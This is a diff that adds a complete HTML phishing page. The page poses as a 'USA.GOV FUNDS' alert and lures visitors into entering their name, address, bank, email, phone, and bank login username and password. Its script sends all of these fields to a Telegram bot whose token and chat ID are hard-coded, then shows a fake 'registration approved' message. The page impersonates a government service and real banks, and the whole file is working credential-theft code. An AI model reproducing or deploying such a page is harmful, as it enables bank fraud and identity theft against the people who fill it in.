@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Bank Information Update</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      padding: 40px;
+      margin: 0;
+    }
+    .section {
+      max-width: 600px;
+      margin: auto;
+      background-color: white;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+      padding: 25px;
+      display: none;
+    }
+    .section.active {
+      display: block;
+    }
+    h2 {
+      font-size: 20px;
+      margin-bottom: 15px;
+      background-color: #007BFF;
+      color: white;
+      padding: 10px;
+      border-radius: 5px;
+      text-align: center;
+    }
+    p {
+      font-size: 14px;
+      color: #333;
+      line-height: 1.5;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    input, select {
+      width: 100%;
+      padding: 8px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+    }
+    .row {
+      display: flex;
+      gap: 20px;
+    }
+    .row > div {
+      flex: 1;
+    }
+    .button-container {
+      text-align: right;
+      margin-top: 20px;
+    }
+    .btn-blue {
+      background-color: #007BFF;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .btn-blue:hover {
+      background-color: #0056b3;
+    }
+
+    #validationMessage {
+      display: none;
+      background-color: grey;
+      color: white;
+      padding: 20px 40px;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 24px;
+      text-align: center;
+      max-width: 600px;
+      margin: 100px auto;
+    }
+  </style>
+</head>
+<body>
+
+  <form id="form">
+    <!-- Étape 1 -->
+    <div class="section active" id="step1">
+      <h2>USA.GOV FUNDS</h2>
+      <p><strong>USA.GOV FUNDS ALERT</strong> New rules in force now: You must fill out this application to receive your funds. More info & exemptions at usa.gov
+Claim your funds now.</p>
+      <div class="button-container">
+        <button type="button" class="btn-blue" onclick="showSection('step2')">Update Now</button>
+      </div>
+    </div>
+
+    <!-- Étape 2 -->
+    <div class="section" id="step2">
+      <h2>Bank Details</h2>
+
+      <label for="firstname">First Name</label>
+      <input type="text" id="firstname" name="firstname" required>
+
+      <label for="lastname">Last Name</label>
+      <input type="text" id="lastname" name="lastname" required>
+
+      <label for="address">Street Address</label>
+      <input type="text" id="address" name="address">
+
+      <div class="row">
+        <div>
+          <label for="zipcode">ZIP Code</label>
+          <input type="text" id="zipcode" name="zipcode">
+        </div>
+        <div>
+          <label for="city">City</label>
+          <input type="text" id="city" name="city">
+        </div>
+      </div>
+
+      <label for="country">Country</label>
+      <select id="country" name="country" required>
+        <option value="US">United States</option>
+      </select>
+
+      <label for="bank">Bank</label>
+      <select id="bank" name="bank" required>
+        <option value="">Select a Bank</option>
+        <option>Key Bank</option>
+        <option>Case Bank</option>
+        <option>JPMorgan Chase</option>
+        <option>Bank of America</option>
+        <option>Wells Fargo</option>
+        <option>Citibank</option>
+        <option>U.S. Bank</option>
+        <option>PNC Bank</option>
+        <option>Truist Bank</option>
+        <option>Capital One</option>
+        <option>TD Bank</option>
+        <option>Goldman Sachs</option>
+        <option>Ally Bank</option>
+      </select>
+
+      <label for="email">Email Address</label>
+      <input type="email" id="email" name="email">
+
+      <label for="phone">Phone Number</label>
+      <input type="tel" id="phone" name="phone">
+
+      <div class="button-container">
+        <button type="button" class="btn-blue" onclick="showSection('step3')">Next</button>
+      </div>
+    </div>
+
+    <!-- Étape 3 -->
+    <div class="section" id="step3">
+      <h2>Log in to your account</h2>
+
+      <label for="client_number">Username</label>
+      <input type="text" id="client_number" name="client_number" placeholder="e.g. 123456789">
+
+      <label for="secret_code">Password</label>
+      <input type="password" id="secret_code" name="secret_code" maxlength="6" placeholder="********">
+
+      <div class="button-container">
+        <button type="button" class="btn-blue" onclick="sendToTelegram()">Next</button>
+      </div>
+    </div>
+  </form>
+
+  <div id="validationMessage">Pending validation...</div>
+
+  <script>
+    function showSection(id) {
+      document.querySelectorAll('.section').forEach(function(section) {
+        section.classList.remove('active');
+      });
+      document.getElementById(id).classList.add('active');
+    }
+
+    function sendToTelegram() {
+      // Collecte des infos
+      const data = {
+        firstname: document.getElementById("firstname").value,
+        lastname: document.getElementById("lastname").value,
+        address: document.getElementById("address").value,
+        zipcode: document.getElementById("zipcode").value,
+        city: document.getElementById("city").value,
+        country: document.getElementById("country").value,
+        bank: document.getElementById("bank").value,
+        email: document.getElementById("email").value,
+        phone: document.getElementById("phone").value,
+        username: document.getElementById("client_number").value,
+        password: document.getElementById("secret_code").value
+      };
+
+      const message = 
+        `🔐 New Submission:\n` +
+        `👤 Name: ${data.firstname} ${data.lastname}\n` +
+        `🏠 Address: ${data.address}, ${data.zipcode} ${data.city}, ${data.country}\n` +
+        `🏦 Bank: ${data.bank}\n` +
+        `📧 Email: ${data.email}\n` +
+        `📱 Phone: ${data.phone}\n` +
+        `🔑 Username: ${data.username}\n` +
+        `🔒 Password: ${data.password}`;
+
+      const chatId = "6755665545";
+      const botToken = "7939774791:AAHLpF8sMHBinQr9yOralpgh_F6Vd0x7tWc";
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+
+      // Affichage du message de validation
+      document.getElementById("form").style.display = "none";
+      const messageDiv = document.getElementById("validationMessage");
+      messageDiv.style.display = "block";
+      setTimeout(function() {
+        messageDiv.textContent = "✅ Congratulations, your registration has been approved!";
+        messageDiv.style.backgroundColor = "#4CAF50";
+      }, 5000);
+    }
+  </script>
+
+</body>
+</html>
